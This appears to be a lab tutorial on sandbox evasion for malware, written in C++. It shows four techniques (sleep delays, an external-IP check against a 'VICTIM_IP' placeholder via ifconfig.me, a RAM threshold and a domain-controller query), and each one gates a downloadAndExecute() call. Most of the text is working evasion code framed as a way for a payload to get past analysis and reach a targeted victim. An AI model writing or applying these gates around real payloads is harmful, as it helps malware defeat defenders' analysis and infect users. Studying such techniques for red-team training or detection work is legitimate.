# Sandbox Evasion Techniques

This document explores various sandbox evasion techniques, demonstrating how to implement and test them in C++. Each section introduces a new evasion method, explains the code, and discusses the results of testing in sandbox environments.

---

## 1. Sleep-Based Evasion

### Concept

A simple yet effective technique is to delay execution using a sleep statement. Many sandboxes have short analysis windows, so sleeping can help evade detection.

### Example

```cpp
int main() {
    sleep(120000); // Sleep for 120,000 ms (2 minutes)
    downloadAndExecute();
    return 0;
}
```

### Testing

- **With Sleep:** No activity is observed during the sleep period.
- **Without Sleep:** Immediate HTTP request is detected.

> **Note:** While effective, this method can be bypassed by advanced sandboxes. Consider using more complex time-wasting operations for better results.

---

## 2. Geolocation Filtering

### Concept

Check the system's external IP address and only proceed if it matches a specific value. This helps avoid execution in sandboxes with known IP ranges.

### Example

```cpp
BOOL checkIP() {
    const char* websiteURL = "https://ifconfig.me/ip";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) break;
        s.append(buff, bytesRead);
    }
    if (s == "VICTIM_IP") {
        return TRUE;
    } else {
        return FALSE;
    }
}
```

**Integration:**

```cpp
int main() {
    if (checkIP() == TRUE) {
        downloadAndExecute();
    } else {
        cout << "HTTP/418 - I'm a Teapot!";
    }
    return 0;
}
```

### Testing

- **With IP Filter:** Execution only proceeds if the IP matches.
- **Without IP Filter:** No restriction; code always executes.

> **Note:** This method is commonly flagged by sandboxes and may reduce your evasion score.

---

## 3. System Memory Check

### Concept

Many sandboxes allocate limited RAM (e.g., 4GB). By checking for a higher memory threshold, you can avoid execution in such environments.

### Example

```cpp
BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {
        return TRUE;
    } else {
        return FALSE;
    }
}
```

**Integration:**

```cpp
int main() {
    if (memoryCheck() == TRUE) {
        downloadAndExecute();
    } else {
        exit(0);
    }
    return 0;
}
```

### Testing

- **With Memory Check:** Exits if less than 5GB RAM.
- **Without Memory Check:** Always executes.

---

## 4. Querying Network Information

### Concept

Check for the presence of a Domain Controller, which is unlikely in sandbox environments.

### Example

```cpp
BOOL isDomainController() {
    LPCWSTR dcName;
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    if (dcNewName.find("\\\\") != string::npos) {
        return TRUE;
    } else {
        return FALSE;
    }
}
```

**Integration:**

```cpp
int main() {
    if (isDomainController() == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
    return 0;
}
```

### Testing

- **With Domain Controller Check:** Only executes if a DC is found.
- **Without Check:** Always executes.

---

## Adding External Dependencies in Visual Studio

For the domain controller check, add the `Netapi32.lib` library:

1. Right-click your project in Solution Explorer.
2. Go to **Properties** > **Linker** > **Input**.
3. Add `Netapi32.lib` to the list of libraries.
4. Click **Apply** and **OK**.

---

## Conclusion

You have now seen several sandbox evasion techniques, including sleep delays, geolocation filtering, system memory checks, and network information queries. Each method has its strengths and weaknesses; choose the most appropriate for your scenario.

In the next task, you will combine these techniques to evade a custom sandbox environment.

